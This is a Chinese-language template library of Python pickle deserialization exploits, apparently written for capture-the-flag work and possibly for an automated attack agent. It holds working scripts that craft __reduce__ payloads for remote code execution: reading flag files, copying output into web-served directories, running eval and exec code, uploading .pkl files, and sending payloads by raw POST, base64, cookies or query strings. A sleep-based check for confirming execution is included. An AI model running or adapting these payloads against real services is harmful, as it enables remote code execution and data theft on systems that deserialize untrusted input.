# Pickle Payload 完整模板库

> 本文件包含各种场景下的 Python Pickle 反序列化 payload 生成脚本。
> 所有脚本保存为 `.py` 文件后直接执行，避免 shell 引号嵌套问题。

## ⚠️ 核心规则

**`__reduce__` 必须返回 `(模块级可调用对象, 参数元组)`**

✅ 正确:
```python
return (os.system, ("cat /flag.txt",))           # os.system 是模块级函数
return (subprocess.check_output, (["ls"],))       # subprocess.check_output 是模块级函数
return (eval, ("__import__('os').system('id')",)) # eval 是内置函数
```

❌ 错误 — 会导致 Internal Server Error:
```python
return (self.my_method, ())        # ❌ 实例方法不行！pickle 无法序列化 bound method
return (subprocess.call, ("ls",))  # ❌ call 的第一个参数是 list 或需要 shell=True
return (lambda: os.system("id"),)  # ❌ lambda 不可 pickle
```

---

## 模板 1: 回显 RCE（最优先）

目标将反序列化结果返回到 HTTP 响应时使用。`subprocess.check_output` 返回 bytes，可能被 repr/str 输出。

```python
# pickle_echo.py — 保存后执行: python3 pickle_echo.py
import pickle, base64, subprocess
class E:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag.txt'],))
payload = base64.b64encode(pickle.dumps(E())).decode()
print(payload)
```

变体 — 多路径尝试:
```python
# pickle_echo2.py — 保存后执行: python3 pickle_echo2.py
import pickle, base64, subprocess
class E:
    def __reduce__(self):
        return (subprocess.check_output, (['/bin/sh', '-c', 'cat /flag.txt 2>/dev/null || cat /flag 2>/dev/null || cat /FLAG.txt 2>/dev/null || ls /'],))
print(base64.b64encode(pickle.dumps(E())).decode())
```

## 模板 2: 写文件外带（无回显场景）

RCE 成功但响应中看不到输出时，将结果写入 Web 可访问路径。

```python
# pickle_write.py — 保存后执行: python3 pickle_write.py
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('cp /flag.txt /app/static/f.txt 2>/dev/null; cp /flag /app/static/f.txt 2>/dev/null; cp /FLAG.txt /app/static/f.txt 2>/dev/null',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

发送 payload 后访问:
- `http://target/static/f.txt`
- `http://target/f.txt`

**常见 Web 可写路径**: `/app/static/`, `/var/www/html/`, `/app/templates/`, `/app/uploads/`

## 模板 3: eval 万能 payload

当不确定目标环境时，`eval` + `__import__` 组合最灵活:

```python
# pickle_eval.py — 保存后执行: python3 pickle_eval.py
import pickle, base64
class E:
    def __reduce__(self):
        return (eval, ("__import__('subprocess').check_output(['/bin/sh','-c','cat /flag.txt'])",))
print(base64.b64encode(pickle.dumps(E())).decode())
```

## 模板 4: 生成 .pkl 二进制文件（文件上传场景）

目标有 pickle 文件上传接口时使用:

```python
# gen_pkl.py — 保存后执行: python3 gen_pkl.py
import pickle, subprocess
class E:
    def __reduce__(self):
        return (subprocess.check_output, (['/bin/sh', '-c', 'cat /flag.txt'],))
with open('/tmp/exploit.pkl', 'wb') as f:
    f.write(pickle.dumps(E()))
print('saved /tmp/exploit.pkl, size:', len(pickle.dumps(E())))
```

然后用 curl 上传:
```bash
curl -s -X POST -F 'pickle_file=@/tmp/exploit.pkl' http://target/
curl -s -X POST -F 'file=@/tmp/exploit.pkl' http://target/upload
```

## 模板 5: 一体化脚本（生成 + 发送 + 读结果）

适合需要精确控制整个过程的场景:

```python
# pickle_exploit.py — 保存后执行: python3 pickle_exploit.py http://target:8080/api/load
import pickle, base64, subprocess, urllib.request, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else 'http://target/'

# 生成 payload
class E:
    def __reduce__(self):
        return (subprocess.check_output, (['/bin/sh', '-c', 'cat /flag.txt 2>/dev/null || cat /flag 2>/dev/null || ls /'],))

payload = pickle.dumps(E())

# 发送方式 1: raw POST body
req = urllib.request.Request(TARGET, data=payload, method='POST')
req.add_header('Content-Type', 'application/octet-stream')
try:
    resp = urllib.request.urlopen(req, timeout=10)
    print('Response:', resp.read().decode(errors='replace'))
except Exception as e:
    print('Raw POST failed:', e)

# 发送方式 2: base64 POST
b64 = base64.b64encode(payload).decode()
req2 = urllib.request.Request(TARGET, data=b64.encode(), method='POST')
req2.add_header('Content-Type', 'text/plain')
try:
    resp2 = urllib.request.urlopen(req2, timeout=10)
    print('Base64 POST Response:', resp2.read().decode(errors='replace'))
except Exception as e:
    print('Base64 POST failed:', e)
```

使用: `python3 pickle_exploit.py http://target:8080/api/load`

## 模板 6: pickle 协议版本兼容

某些旧 Python 环境需要低版本协议:

```python
# pickle_compat.py — 保存后执行: python3 pickle_compat.py
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt > /app/static/f.txt',))

# 协议 0（ASCII，最大兼容性）
print('Protocol 0:', base64.b64encode(pickle.dumps(E(), protocol=0)).decode())
# 协议 2（Python 2/3 兼容）
print('Protocol 2:', base64.b64encode(pickle.dumps(E(), protocol=2)).decode())
# 协议 4（默认，Python 3.4+）
print('Protocol 4:', base64.b64encode(pickle.dumps(E(), protocol=4)).decode())
```

## 模板 7: exec 多步操作

需要执行多条语句时（如先读文件再写文件）:

```python
# pickle_exec.py — 保存后执行: python3 pickle_exec.py
import pickle, base64
class E:
    def __reduce__(self):
        code = '''
import os, subprocess
try:
    flag = open('/flag.txt').read()
    open('/app/static/out.txt','w').write(flag)
except:
    try:
        flag = subprocess.check_output(['find','/','-name','flag*','-maxdepth','3']).decode()
        open('/app/static/out.txt','w').write(flag)
    except:
        pass
'''
        return (exec, (code,))
print(base64.b64encode(pickle.dumps(E())).decode())
```

## 发送方式速查

| 场景 | 发送方法 |
|------|---------|
| Cookie 中的 pickle | `http_request headers={"Cookie":"session=<b64>"}` |
| POST body (raw) | `curl -s -X POST --data-binary @/tmp/exploit.pkl http://target/` |
| POST body (base64) | `http_request method="POST" body="<b64>" headers={"Content-Type":"text/plain"}` |
| 文件上传 | `curl -s -F 'file=@/tmp/exploit.pkl' http://target/upload` |
| multipart pickle_file | `curl -s -F 'pickle_file=@/tmp/exploit.pkl' http://target/` |
| query param | `http_request url="http://target/?data=<url_encoded_b64>"` |

## 验证 RCE 成功

如果不确定 RCE 是否执行:
```python
# pickle_sleep.py — 用 sleep 测试，如果响应延迟 5 秒说明 RCE 成功
# 保存后执行: python3 pickle_sleep.py
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('sleep 5',))
print(base64.b64encode(pickle.dumps(E())).decode())
```
